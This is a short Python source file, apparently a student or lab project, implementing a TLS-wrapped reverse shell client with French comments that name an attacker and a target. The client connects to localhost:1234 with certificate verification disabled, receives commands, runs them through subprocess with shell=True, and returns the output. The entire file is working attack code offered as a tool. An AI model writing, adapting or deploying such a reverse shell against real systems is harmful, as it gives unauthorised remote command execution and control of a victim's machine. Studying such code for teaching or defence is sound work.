# client_revershell
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies suivantes :
# socket = communication entre l'attaquant et la cible
# ssl = chiffrement des échanges
# subprocess = exécution des commandes
# os = manipulation des commandes de l'OS
import socket
import ssl
import subprocess
import os

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname='localhost')
wrappedSocket.connect(('localhost', 1234))

try:
   while True:
        received_data = wrappedSocket.recv(1024)
        # Send the output of the command over the SSL connection
        # Execute a system command

        cmd = received_data.decode().split()
        print(cmd)
        received_data = 0
        # la commande a-t-elle des paramètres ?
        if len(cmd) >= 2:
            if cmd[0] == "cd" or cmd[0] == "CD":
                os.chdir(cmd[1])
                output = "changed directory to {}".format(cmd[1])
                wrappedSocket.sendall(output.encode())
            else:
                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
                output, err = command.communicate()
                if not err:
                    wrappedSocket.sendall(output)
                elif not output:
                    wrappedSocket.sendall(err)
                else:
                    wrappedSocket.sendall("err")
        else:
            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            output, err = command.communicate()
            wrappedSocket.sendall(output)
finally:
    wrappedSocket.close()